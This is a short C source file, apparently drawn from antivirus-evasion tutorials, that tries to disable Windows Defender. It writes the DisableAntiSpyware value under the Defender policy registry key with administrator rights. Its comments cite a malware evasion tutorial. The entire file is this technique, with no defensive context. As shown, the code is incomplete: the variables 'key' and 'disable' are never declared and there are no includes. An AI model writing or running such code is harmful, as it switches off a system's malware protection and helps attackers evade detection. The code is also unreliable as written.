
//This source code disables windows defender

//For running succesfully its needed admin rights and create the following subkey

//DisableAntiSpyware

//Fuentes:
//https://www.techsupportall.com/how-to-enable-disable-microsoft-windows-defender-in-windows-10/#:~:text=Do%20double-click%20on%20HKEY_LOCAL_MACHINE,Policies%5CMicrosoft%5CWindows%20Defender.
//https://cocomelonc.github.io/tutorial/2022/06/05/malware-av-evasion-7.html


int main(){

  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key);


  if (res == ERROR_SUCCESS) {
    RegSetValueEx(key, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegCloseKey(key);

  }
  return 0;
}
